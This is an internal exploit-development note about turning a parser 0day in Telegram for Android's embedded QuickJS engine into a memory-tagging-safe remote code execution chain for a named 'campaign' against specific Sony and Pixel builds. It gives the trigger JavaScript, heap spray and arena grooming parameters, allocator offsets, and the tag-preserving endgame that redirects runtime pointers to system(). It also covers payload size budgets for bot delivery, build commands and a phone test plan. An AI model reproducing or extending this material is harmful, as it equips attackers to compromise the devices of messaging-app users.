# Parser 0day under MTE — route 2 (arena `b`) and the same-payload verdict

Date: 2026-11-08. Host-only: no device, no Frida, no bot, no network payload
delivery. Scope: can the **`ARG_SCOPE_END` parser 0day** (c2560s family) be
made MTE-safe without replacing the bug, and can the same payload be universal
across the two targets of the current campaign:

* **Sony XQ-BT52, Telegram beta 13.2.2 (72929)**, MTE off, 6 MiB JS heap;
* **Pixel 9, Telegram release 13.2.0 (72801)**, MTE on, 8 MB JS heap.

Constraints from the orchestrator: one same payload, no per-build/per-device
hardcodes, **≤ 4,096 zlib9** (Pixel bot limit). N1 is the primary effort, C2
the backup. This note does not change that ranking: the parser route is a
**long shot**, see §0.

All paths relative to `telegramandroidwidget/` unless absolute. New artifacts
are under `lab/qjs_fork_audit/mte_route2_20261108/`.

---

## 0. Verdict (short)

1. **MTE: yes, there is a route that does not replace the bug.** Put the
   vulnerable function's `JSFunctionBytecode` `b` in the **QuickJS arena**
   (a small block, class 352) instead of Scudo, and put the +1,310,828-byte
   OOB target in a **sprayed arena class-512 ArrayBuffer data block**. Both
   are plain `mmap(PROT_READ|PROT_WRITE)` slabs of the fork's
   `JS_ARENA_SLABS` allocator: not `PROT_MTE`, tag 0, no tag check. The OOB
   read is cross-allocation but **tag 0 → tag 0**, and the closure-array /
   victim-AB write is the same class-64 arena page as before. Host: full
   chain (stage A forge + the c2560s endgame) 5/5, plus 5/5 under a 3 MB
   widget-like preload, and the primitive 15/15 at 6/8 MiB; proof written.
2. **Same-payload across Sony 72929 beta and Pixel release 72801: not
   established.** Route 2 removes the *Scudo class map* and the *MTE
   cross-tag* dependencies, and the Pixel release 13.2.0 (72801) lib carries
   the same **QuickJS-ng 0.17.0** strings as the 72929 beta lib. But the
   load-bearing device geometry (arena slabs contiguous for ≥21 slabs, the
   target slot class, the target phase) is **host-proven only**; the Pixel
   release's `JS_ARENA_SLABS`/fork snapshot and the parser bug site are
   inferred from strings, not verified; there is **no Pixel run**; the CMD is
   still the beta package path; and the symbol-safe variant is 4,079 zlib9,
   17 bytes under the limit, leaving no room for per-device tuning.
3. **Therefore: deprioritize the parser vs N1.** The shipped c2560s payload
   is not universal (Scudo-class-specific, beta CMD, no Pixel run); the
   route-2 MTE variant is the only parser form with a plausible same-payload
   story, but the remaining device geometry/ABI margin makes it a long shot.
   N1 gets the effort; the parser stays as this note's host evidence.

---

## 1. MTE model correction (important)

The prior note (`MTE_safe_hunt_20261107.md` §2.1) says "a tagged pointer into
an untagged granule faults just like the reverse". The authoritative model is
narrower:

* Tag checks are performed **only on pages mapped with `PROT_MTE`** (Linux
  arm64 MTE doc: "When `PROT_MTE` is enabled on an address range and a
  mismatch between the logical and allocation tags occurs on access …"; the
  allocation tag is 0 when such pages are first mapped).
* On non-`PROT_MTE` memory the top byte is ignored (TBI, the Android tagged
  address ABI), so **tag 0 into untagged memory never faults**, and a
  non-zero tag into untagged memory is ignored (this is why the c2560s TBI
  tag-strip worked on the non-MTE Sony).
* The c2560s parser OOB is unsafe because `b` and the target are both in the
  **Scudo primary class region**, which Scudo maps with `MAP_MTE` when MTE is
  active (`primary64.h`: `MAP_MTE` on the user remap), and the target chunk's
  allocation tag differs from `b`'s tag. The first `vd->scope_level` load is
  on a `PROT_MTE` granule with a mismatched tag → `SEGV_MTESERR`.
* Consequence: an untagged target (arena, or the untagged data part of a
  Scudo secondary allocation) is unchecked **even if the source pointer is
  tagged**. That is what route 2 exploits; it is also why route 1b is not
  impossible in principle.

The AOSP Scudo secondary source (fetched from
`android.googlesource.com/platform/external/scudo`, `main`,
`standalone/secondary.h`) supports the secondary part: the user pointer is
`HeaderPos + LargeBlock::getHeaderSize()` (untagged, tag 0), the header page
is the only `MAP_MEMTAG` prefix, and the data mapping is `Flags` without
`MAP_MEMTAG`. The Pixel smaps evidence (8 KiB `mt` prefixes followed by
untagged data mappings) matches this.

---

## 2. Route 2 — the host result

### 2.1 Shape and addresses

Runtime-created vulnerable function (anonymous function expression, so no
extra name-binding var; `cvc=0`, `argc=1`, `varc=6`, `count=7`, exactly the
c2560s victim geometry):

```js
var S = '"use strict"; globalThis.f = function ([] = eval("[]")) { var q1=0,q2=0,q3=0; return 0; };';
(0, eval)(S);                 /* b is created AFTER the arena spray */
```

Measured on the fork snapshot `2dfeee3e` (`zeroday_hunt_parser/src`, same
source as the device engine; `sizeof` values are host x86-64, AArch64
identical for these structs):

```
JSFunctionBytecode=128  JSVarDef=20  JSClosureVar=8
JSArrayBuffer=56  JSObject=72  JSTypedArray=48
FSIZE f: argc=1 varc=6 cvc=0 cpool=0 bc=45 fsize=313
ACV BSIZE 344            -> arena block class 352 (block header 8 + 344)
vardefs = b+128; target = vardefs + 20*(1+65534) = b + 1,310,828
```

`b` is therefore an **arena block**, not a Scudo allocation. On the device
the fork's `js_arena_malloc` handles every `size+8 <= 512` request from the
64 KiB `JS_ARENA_SLABS` `mmap` (no `PROT_MTE`), so `b->vardefs` is tag 0.

### 2.2 The spray and the target geometry

Parameters of the working host widget (`poc/s2_stageA.js`):

* `N1 = 4000` × `new ArrayBuffer(488)` (data block class 512, 7 blocks per
  4 KiB page), each filled with the 20-byte fake `JSVarDef` pair
  (`RT`/`RJ`, `var_name=4`, `scope_level=5`, `scope_next=4/65535`,
  `flags=0x04`);
* `N2 = 390` × `new ArrayBuffer(320)` (class-352 data) to exhaust the
  class-352 free blocks so the runtime `b` page is taken in the current
  arena slab;
* `D = 600` × `AB(64)` drain and `T = 600` × `AB(64)` victims, `T[598]=null`
  (the original c2560s class-64 victim groom; count=7, 56-byte closure
  array, class 64);
* phase/parity sweep over `ph ∈ {0,4,8,12,16}`, `q ∈ {0,1}`, hit check
  `T[i].byteLength > 1024`.

The instrumented allocator (`src/quickjs.c` in the lab) proves the geometry:

```
MTE2T b=0x...2f8 vd=0x...378 target=0x...364 diff=1310828 argc=1 varc=6 cvc=0
MTE2T INSLAB t_slab_idx=44 b_slab_idx=64 t_base=...000 b_base=...000
      slab_delta=1310720 off=50020 slot=12 poff=868
MTE2T ARENA cls_idx=30 bs=512 nblocks=7 nused=7 firstfree=65535
      bidx=1 boff=308 in_user=1
```

`1310720 = 20 × 65536`: the target is exactly **20 arena slabs above `b`'s
slab**, in the same slot index, inside a class-512 user block (offset 308 of
block 1). The spray slabs are contiguous mmaps (host list shows 60+ slabs
with 64 KiB stride). The target's 20-byte record at offset 300/868 etc. is
phase-aligned; the first attempt `ph=0,q=0` hit.

### 2.3 Host results

Primitive (`build/run6m2`, the instrumented fork build):

| test | result |
|---|---|
| `poc/s2_sweep.js`, 6 MiB, 10 runs | **10/10** `RESULT ABLEN[599]=327744 ph=0 q=0` |
| same, 8 MiB, 5 runs | **5/5** |
| heap floor (no preload) | works at 4.2 MiB; OOM at 4.0 MiB |
| trigger `malloc_size` (no symbols) | **4,310,528** (4.11 MiB), count 26,567 |
| trigger `malloc_size` (symbol-safe stage A, N2=415) | **5,863,976** (5.59 MiB), count 36,905 |
| host CPU, whole no-symbol sweep | **9.5 ms** median (5 runs) |

Full chain (app-like sibling-script harness `run_sib_plain`, one `JS_Eval`
per `<script>`, `document`/`console` shims, host endgame + proof):

| test | result |
|---|---|
| `poc/s2_full_host.html`, 8 MiB, 5 runs | **5/5** `VDOM=S1 ABLEN[599]=327744 ph=0 q=0 VLEN=327744 END=HF OK`; `/tmp/hf_proof` **162 B** (`uid=…` + `HF`) |
| `poc/s2_preload_host.html` (3 MB strings/objects preload), 8 MiB, 5 runs | **5/5** same `END=HF OK` |
| same with a **6 MiB** limit and 3 MB preload | fails (preload + stage A total > 6 MiB); the 6 MiB device profile needs the no-preload/no-symbol tuning |
| symbol-safe stage A (N2=415) + endG9s, 8 MiB, 3 runs | **3/3** `ABLEN[599]=327744 ph=12 q=1 n=8 VLEN=327744 END=HF OK` + 162 B proof |
| host wall time, full chain | 51.6 ms (no-symbol, 1 attempt) / 75.0 ms (symbol, 8 attempts) |

The existing c2560s host endgame consumes the route-2 forge unchanged: the
forged `ArrayBuffer` is the same 327,744-byte view and `T[599]` is the same
victim. This is expected: the endgame never reads `b`.

### 2.4 Why this is MTE-safe

| access | memory | tag check |
|---|---|---|
| `b->vardefs[argc+65534]` (the OOB read) | arena class-512 data block, 20 slabs above `b` | **no** (`PROT_READ|WRITE`, no `PROT_MTE`, tag 0) |
| fake `vd` fields / chain | same arena block | no |
| `s->closure_var[7..8]` writes | arena class-64 page (next block = `T[599]` struct) | no |
| `T[599].byte_length` (entry 8) | arena class-64 struct | no |
| forged `Uint8Array(VAB)` window | arena data block + forward slabs | no |
| `JS_DupAtom(4)` / `JS_DupAtom(65535)` (shifted read) | atom table (secondary/large) + atom structs (arena) | no for tag-0/tag-0; the atom table is a secondary allocation (tag-0 user pointer) |
| endgame `realm`/`rt` | Scudo primary (possibly `PROT_MTE`) | **yes, must preserve the pointer tag** — see §5 |

The stage A never dereferences a tagged Scudo pointer. It is tag 0 → tag 0
throughout, so it is safe under both the strict and the lenient MTE
semantics.

### 2.5 Device-specific conditions (not yet measured)

1. **Arena slab contiguity**: the target is `b + 20*65536`; the spray must
   own the slab 20 (or 21) positions above `b`'s slab. Host: yes. Android 17
   on the Pixel and Android 13 on the Sony: unmeasured; the kernel mmap
   sequence and the app's startup mappings are the risk.
2. **Target slot class**: the target page is the same slot index as `b`'s
   page in the slab 20 above. On the host the spray slab composition is a
   repeating page-class pattern:
   `0:512 1:112 2:512 3:64 4:512 5:112 6:512 7:512 8:512 9:112 10:512
   11:512 12:56 13:112 14:512 15:512`. `b`'s slot `s_b` is chosen by
   `arena_slab_take`; if `s_b` is a 512 slot the target is our pattern; if
   it is 112/64/56 the target page is engine data (host N2=390/395 crashed
   this way). The N2 sweep moves `s_b`; the host hits for
   N2 = 385, 400, 405, 415, 425 and misses/crashes for 380, 390, 395,
   410, 420, 430 (table in `logs/route2_symbol_n2_sweep.txt`). The device
   layout will differ; **the payload cannot carry a per-device N2 sweep
   and stay under 4,096 zlib9**.
3. **Phase**: the target offset mod 20 depends on `s_b` and `b`'s block
   index `k` (`t = 164 + 352k` within the target page). The 5-phase sweep
   covers all multiples of 4; without the atom pre-grow a misaligned phase
   can read `var_name=65535` and crash. The symbol pre-grow (65,600
   `Symbol()`, keep last 3,000) makes the shifted reads safe, as in the
   c2560s, but costs ~1.55 MB charged heap and changes `s_b`.
4. **Crossing case**: if `b`'s block index is k=4, the target record sits at
   user offset 492 and its second record lands at the next block's user
   byte 0, which the same-phase fill leaves zero (host N2=380 NOCORR). This
   is 1 of 11 block indices; a device payload can try a different N2, but
   that is per-device tuning.
5. **Heap**: the no-symbol stage A uses 4.31 MB charged; the symbol-safe
   stage A (N2=415) uses **5.86 MB** (65,600 Symbols cost ~1.55 MB). The
   symbol variant still hits at a 6 MiB limit in isolation (0.43 MB
   headroom) and the full chain is 3/3 at 8 MiB, but with the app boot live
   set added it is tight against the Sony 6 MiB and Pixel 8 MB budgets. The
   no-symbol variant is the only comfortable heap profile; it lacks the
   phase-safety pre-grow. Another reason the same-payload claim is not
   actionable.

---

## 3. Route 1 — `b` > 64 KiB (Scudo secondary)

### 3.1 Source shapes (measured)

| source shape | `b` fsize | Android path | host cost |
|---|---:|---|---|
| `return 1.5+…` × 4096 floats (runtime string ~13 KB) | **89,655** | secondary (>64 KiB) | 2 ms, tiny heap |
| × 8192 floats | 179,767 | secondary | 3 ms |
| × 20,000 floats | 439,543 | secondary | 6 ms |
| `q=q+1;` × 60,000 (`bc=180,038`) | 180,266 | secondary | needs **7.5 MiB** heap |
| × 65,000 bytecode statements | — | — | OOM at 8 MiB |
| need `byte_code_len > 1,310,560` (target inside `b`) | — | — | 1.31 MB bytecode ≈ many × the 180 KB case; peak is superlinear (180 KB → 7.5 MiB), so **> 50 MiB**: infeasible in the 6/8 MiB widget |

### 3.2 Secondary tag domain (AOSP source + smaps)

`mapSecondary` with MTE tags only `[CommitBase, UntaggedPos)` and leaves the
data mapping untagged; the user pointer is tag 0. So a secondary `b` has
`b->vardefs` tag 0, and a target in another secondary data mapping is
unchecked. The Pixel smaps' 8 KiB `mt` prefixes + untagged data mappings are
consistent.

### 3.3 Why route 1 is not the chosen route

* `b` 64 KiB–1.31 MB: the target is 1.31 MB past the *end* of `b`'s mapping;
  covering it needs a secondary mapping exactly there. Scudo secondary
  `mmap`s are not a per-class contiguous region like the primary; there is
  no host-model proof and no device probe. A 1.31 MB linear displacement
  into a spray of individually `mmap`ed chunks with guard pages is not the
  same problem as route 2's 64 KiB-slab run.
* `b` > 1.31 MB (target inside `b`'s own bytecode): needs >1.31 MB of
  bytecode; measured heap scaling makes it infeasible in the widget limit.
  Even if it fit, the target bytes would have to be crafted inside compiler
  bytecode and the function body is never executed (parameter initialiser
  throws), which is a research project of its own.
* Verdict: **long shot, not adopted**. Route 1b remains a note: if a
  secondary-only spray and a 1.31 MB containment were ever demonstrated,
  it would be Scudo-map-independent; but it is unproven on the host and the
  device.

---

## 4. Routes 3 and 4

**Route 3 — same-tag target control.** No JS-level way to choose a Scudo tag,
`MAP_MTE`, or `prctl`: the widget has no such API, and Scudo's tags are
random per chunk with odd/even parity. The only controllable tag-0 domains
are the QuickJS arena (route 2) and secondary user data (route 1b). A
same-tag *primary* target would rely on the 1/15 random coincidence over a
multi-granule 20-byte record; not a route.

**Route 4 — different parser/atom target.** The iOS crash was
`JS_DupAtom` with `vd->var_name=917519`, `atom_array[917519]=NULL`. That is
the second dereference of the fake vardef, not a separate target: a valid
atom index (or `var_name=4` in the c2560s) is safe and in-bounds; an invalid
index is a cross-tag read of the atom table. The c2560s Android victim is
the class-2560 `ArrayBuffer` data spray (Scudo primary), not the atom table.
The atom-table path cannot be made a controlled write target without
controlling `rt->atom_array` growth and the fake record's `var_name`, and it
does not avoid the cross-tag issue. The usable parser primitive remains the
`b->vardefs` OOB, whose target route 2 moves to the arena.

---

## 5. Route 5 — the rest of the chain and the tag-preserving endgame

The stage A forge is tag-safe; the c2560s endgame is *not* as shipped. It
uses `p48`/`a48F`/`p48D` = `(hi % 65536) * 2^32 + lo`, which strips the top
byte (tag), and `setF` re-points the forged AB's data pointer to the stripped
address. The tag domains along the chain:

| endgame step | pointer | domain | tag-safe? |
|---|---|---|---|
| scan `V[0,4096)` for the forged AB struct | `D2` (arena data) | arena | yes (tag 0) |
| `setF(obj/shape/proto/prop/pay)` | arena objects | arena | yes (tag 0) |
| `ctor` → `u.cfunc.realm` (JSContext*) | Scudo primary | **tagged** | only if the tag is preserved |
| `realm+16` → `rt` (JSRuntime*) | Scudo primary | **tagged** | only if preserved |
| `rt->malloc_limit`, `rt->mf.js_free` | Scudo primary | tagged | only if preserved |
| ELF/GOT (`jsf`, `free`, `system`) | libc text/data | tag 0 | yes |
| `rt+64 = VBase`, `rt+16 = system` | Scudo primary | tagged | only if preserved |
| `system(cmd)` | libc text + arena cmd | tag 0 | yes |

The minimal fix (`lab/.../endG9s.js`, host-validated) adds:

* `hiF(q) = r32F(q+4)` (keep the full high word, including the tag byte);
* `setF2(A,hi)` writes the AB data field's low word `A` and high word `hi`
  with the exact tag, and restores `VBase` afterwards;
* `probe()` captures `realmHi`/`rtHi` and returns them; `setF2(realm,realmHi)`
  and `setF2(rt,rtHi)` replace `setF`;
* `wrRt(A,v,ah)` uses `setF2(A,ah)` so the `rt+64`/`rt+16` writes carry
  `rt`'s tag.

Host test: the unminified `endG9s.js` + route-2 stage A + stage C gives
`END=HF OK` and the 162-byte proof **3/3** (`poc/s2_full_g9_host.html`).
The host has no tags, so this validates the logic (the `hi` words are the
VA high words, tag 0), not the tag behaviour; the tag behaviour is the v7
proven pattern (`BigInt.asUintN(64, …)` / full-word re-point).

The remaining endgame caveats:
* it still uses Number arithmetic for 48-bit addresses (safe: < 2^53);
  the pointer *writes* use the exact hi word, so no tag is lost;
* the class-24 fallback writes `VBase` (arena, tag 0) — fine;
* the `realm`/`rt` *reads* through `FAR` use the full tagged pointer; the
  engine's typed-array access preserves it (v7 proof);
* the `CMD` is still the beta package path (see §6).

---

## 6. Same-payload analysis — Sony 72929 beta vs Pixel release 72801

### 6.1 The two targets

| target | app | libtmessages.49.so | QuickJS-ng 0.17.0 strings | MTE | heap |
|---|---|---:|---|---|---|
| Sony XQ-BT52 | beta 13.2.2 (72929), `org.telegram.messenger.beta` | 27,070,032 | yes (3/3) | off | 6 MiB |
| Pixel 9 | release 13.2.0 (72801), `org.telegram.messenger` | 27,052,872 | yes (3/3) | on | 8 MB |
| (older release) | 72371 | 22,129,704 | **no (0/3)** | — | — |
| (beta 13.2.0) | 72789 | 26,997,240 | yes (3/3) | — | — |
| (beta 13.2.1) | 72889 | 27,069,808 | yes (3/3) | — | — |

The Pixel release `release_updated/base.apk` is **versionName 13.2.0,
versionCode 72801** (androguard). Its `libtmessages.49.so` contains
`out of memory in regexp execution`, `too many variables declared (only %d
allowed)` and `invalid assignment left-hand side`, exactly like the 72929
beta and 72889 beta libs. The 72371 release lacks them. So the Pixel release
is the **QuickJS-ng 0.17.0 generation**, the same generation in which the
parser bug was found (and in upstream `e22ce4d`). The bug site is not a
Telegram fork patch; it is upstream. That is the strongest positive for
same-payload.

The remaining unknowns:
* **`JS_ARENA_SLABS` in the 72801 release**: the slab allocator was added to
  the fork on 2026-10-12 (`lab/fork_fuzz/src` git log, `27787d3`); the
  72801 release (13.2.0) is close to the 72889/72929 libs but not proven to
  contain it. Route 2 depends on the 64 KiB slab run. If the release uses
  the classic per-4 KiB arena, route 2 fails.
* **Exact fork snapshot/ABI**: `sizeof(JSFunctionBytecode)` class 352,
  `JSArrayBuffer` 56, `JSTypedArray` 48, `JSObject` fields. The v7 payload
  proves the AB/typed-array/JSObject fields on the Pixel release; the
  `JSFunctionBytecode` size is a fork ABI constant, inferred from 0.17.0,
  not measured on the 72801 lib.
* **Arena slab contiguity / slot class / phase** on Android 17 and in the
  release app's boot state: host-only.
* **`LIM`**: the endgame accepts `{0x800000, 0x600000, 0x400000}`; both
  targets are covered.
* **CMD/package**: the c2560s CMD is
  `id>/data/data/org.telegram.messenger.beta/files/n1` (beta path). The
  same payload on the Pixel release needs a package-neutral command or a C2
  bootstrap that handles `org.telegram.messenger`. A `$()`-based
  package-neutral command fits ~54 bytes but is unverified on toybox sh;
  the v7 C2 bootstrap is the proven cross-package mechanism. This is a
  per-package constant in the current chain, i.e., **not** same-payload.

### 6.2 Size (the 4,096 zlib9 budget)

The c2560s shipped final is **9,946 raw / 4,023 zlib9** (A 2,228, B 7,182,
C 408). Route 2 candidates built with the tag-preserving endgame (`endG9s`,
terser `-c passes=2 -m`, device CALIGN=4, device CMD):

| variant | A | B | C | raw | zlib9 |
|---|---:|---:|---:|---:|---:|
| route 2, no-symbol stage A (`poc/s2_stageA.js`) | 1,695 | 7,474 | 408 | 9,705 | **4,001** |
| route 2, symbol-safe stage A (`poc/s2_symA.js`, N2=415) | 1,845 | 7,474 | 408 | 9,855 | **4,079** |

Both are under 4,096 (95 / 17 bytes of margin). The no-symbol variant has
the phase risk; the symbol variant has 17 bytes of margin and no room for
an N2/phase/geometry change. A per-device tuning byte would break the
Pixel bot limit — another reason the same-payload claim is not actionable.

### 6.3 Does route 2 remove the per-build dependence?

It removes the two specific blockers the orchestrator named:
* the **Scudo class ladder** (2560/4096, page-size/revision-dependent): route
  2 uses only QuickJS arena classes 352/512/64, which are fork ABI
  constants shared by the 0.17.0 generation;
* the **MTE cross-tag** access: tag 0 → tag 0.

It does **not** remove:
* the dependence on the Pixel release's fork snapshot/`JS_ARENA_SLABS` and
  parser bug (inferred, not verified);
* the dependence on the Android 17 arena-slab layout and the release app's
  boot/slab state (host-only);
* the per-package CMD;
* the per-device N2/phase tuning that the payload cannot carry inside 4,096
  zlib9.

**Bottom line for the campaign:** the parser is not a same-payload carrier
we can plan around. Per the orchestrator's rule, it is **deprioritized vs
N1**; the MTE route is recorded as a host-proven long shot, not a delivery
candidate. The v7 n-day remains the proven same-payload C2 reference on
both targets (Sony 72929 beta and Pixel release, MTE-on).

---

## 7. Device test plan (only if the parser is revisited)

Host-only study; the orchestrator owns the phone. If a parser probe is ever
run, the order is:

1. **Safe containment probe** (no endgame, no forge): stage A with the
   all-4 word filler (`PB[o]=4` at every 4-byte word) — every 20-byte window
   is the safe TERM record (`var_name=4`, `scope_level=4`, `scope_next=4`,
   `flags=0x04`), so a contained target writes the closure array + the
   neighbour header but does not forge; a non-contained target is a plain
   SIGSEGV. Marker written before the trigger. Use the no-symbol probe
   first (smallest, 4,001-class budget); the symbol probe is the safe-phase
   variant. Expected: widget survives and the marker is rendered.
2. **Forge probe** (no endgame): the RT/RJ stage A + hit check, marker
   `ABLEN[599]=327744`. If `NOCORR`, the target slot/phase missed; do not
   send the endgame.
3. **Full chain** only after 2: the tag-preserving `endG9s` + a
   package-neutral CMD (or the C2 bootstrap on the Pixel), first on the
   Sony (MTE off) to validate stage B, then on the Pixel (MTE on).
4. **Evidence to collect**: logcat, `/proc/<pid>/smaps` `mt` counts and
   mapping names, the tombstone signal (`SEGV_MTESERR` vs plain `SIGSEGV`),
   the widget marker. A `SEGV_MTESERR` would mean the target was in a
   `PROT_MTE` mapping (route 2 geometry missed); a plain SEGV means an
   unmapped target or a bad record.

Do not run this before the N1 work; it is a long-shot branch.

---

## 8. Artifacts / repro

```
notes/parser_mte_route2_samepayload_20261108.md   this note
lab/qjs_fork_audit/mte_route2_20261108/
  src/quickjs.c                 fork 2dfeee3e + MTE2 slab/target instrumentation
  harness.c                     single-eval harness (6/8 MiB)
  build/run6m2                  gcc -O2 instrumented build
  poc/s2_stageA.js              working no-symbol stage A (A=1,695)
  poc/s2_sweep.js               primitive with hit check
  poc/s2_full_host.html         full host chain (c2560s host endgame + proof)
  poc/s2_preload_host.html      full chain under 3 MB preload
  poc/s2_symA.js                symbol-safe stage A (A=1,845)
  poc/s2_sym.js / s2t_*.js      N2 sweep variants
  poc/s2_device_candidate.html  device candidate, no-symbol + endG9s (4,001 zlib9)
  poc/s2_sym_device.html        device candidate, symbol + endG9s (4,079 zlib9)
  endG9s.js                     tag-preserving endgame (host-validated)
  poc/endG9s_host.js            host substitution
  poc/s2_full_g9_host.html      route-2 + endG9s full chain
  gen_s2.py                     stage-A generator
  logs/                         host matrices, N2 sweep, lib fingerprint
```

Repro:

```bash
cd lab/qjs_fork_audit/mte_route2_20261108
gcc -O2 -g -DNDEBUG -I src harness.c src/quickjs.c src/libregexp.c \
    src/libunicode.c src/dtoa.c -lm -o build/run6m2
./build/run6m2 -l 6 poc/s2_sweep.js
./build/run_sib_plain -l 8 poc/s2_full_host.html
./build/run_sib_plain -l 8 poc/s2_preload_host.html
./build/run_sib_plain -l 8 poc/s2_full_g9_host.html
```

The `run_sib_plain` binary is copied from
`lab/qjs_fork_audit/zeroday_hunt_parser/build/run_sib_plain`; it models the
widget sandbox (one `JS_Eval` per whitelisted `<script>`, continues after
exceptions).

---

## 9. Limits / honest negative

* All new measurements are x86-64 host builds of the shipped fork source.
  The device is AArch64; the allocator classes/sizes are architecture-
  independent for these structs, but the mmap layout and the Scudo/secondary
  behaviour are not.
* The route-2 MTE safety is a **tag-domain** argument plus host evidence; it
  is not an MTE-on device measurement. The host cannot simulate tags.
* The Pixel release 72801's `JS_ARENA_SLABS`, exact fork snapshot and parser
  bug site are inferred from the QuickJS-ng 0.17.0 strings and the v7
  cross-build proof; they are not verified on the release lib or the device.
* The route-2 target geometry (20 contiguous slabs, same slot, phase) is
  host-measured only. The device N2/phase tuning is per-device and does not
  fit in the same 4,096-byte payload.
* The tag-preserving endgame is host-validated only with tag 0 (x86-64); the
  tag behaviour is the v7 BigInt pattern, not a host measurement.
* Route 1 (secondary) is not disproven; it is unproven and not pursued.
* No existing file was deleted; no device, Frida, bot or network payload
  delivery was used. The release libs (72371/72801) and beta libs
  (72789/72889/72929) were read only for the QuickJS-ng fingerprint.
